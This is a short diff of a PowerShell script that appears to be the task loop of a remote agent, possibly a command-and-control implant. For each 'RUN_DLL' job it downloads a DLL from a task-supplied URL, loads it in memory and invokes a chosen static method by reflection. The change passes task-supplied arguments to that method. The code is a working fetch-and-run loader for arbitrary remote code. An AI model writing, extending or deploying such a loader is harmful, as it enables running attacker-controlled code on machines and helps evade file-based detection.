@@ -95,6 +95,7 @@ foreach ($t in $job.tasks) {
             $url = $t.url -as [string]
             $className = $t.class -as [string]
             $methodName = $t.method -as [string]
+            $args = $t.args -as [string[]]
             try {
                 $wc = New-Object System.Net.WebClient
                 $bytes = $wc.DownloadData($url)
@@ -106,7 +107,7 @@ foreach ($t in $job.tasks) {
                     $method = $type.GetMethod($methodName, [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static)
                     if ($method) {
                         Write-Host "RUN_DLL: Invoking $className.$methodName..." -ForegroundColor Cyan
-                        $method.Invoke($null, $null)
+                        $method.Invoke($null, @($args))
                         Write-Host "RUN_DLL: Execution complete." -ForegroundColor Green
                     } else {
                         Write-Host "RUN_DLL error: Method $methodName not found." -ForegroundColor Red
